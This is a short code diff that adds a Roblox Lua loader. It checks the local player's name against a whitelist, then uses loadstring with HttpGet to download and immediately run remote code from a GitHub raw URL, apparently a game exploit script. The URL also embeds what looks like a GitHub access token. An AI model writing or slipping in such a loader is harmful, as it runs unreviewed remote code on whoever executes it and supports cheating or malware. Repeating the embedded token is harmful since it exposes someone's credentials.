@@ -1,0 +1,2 @@
+whitelist = {"Woepsa2"}if table.find(whitelist, game.Players.LocalPlayer.Name) then
+loadstring(Game:HttpGet("https://raw.githubusercontent.com/shizhongzhe/sitiegui/refs/heads/main/LEDpro?token=GHSAT0AAAAAADCSZ7V3UH4QQP32SL2LKOCC2AGQGRQ"))()
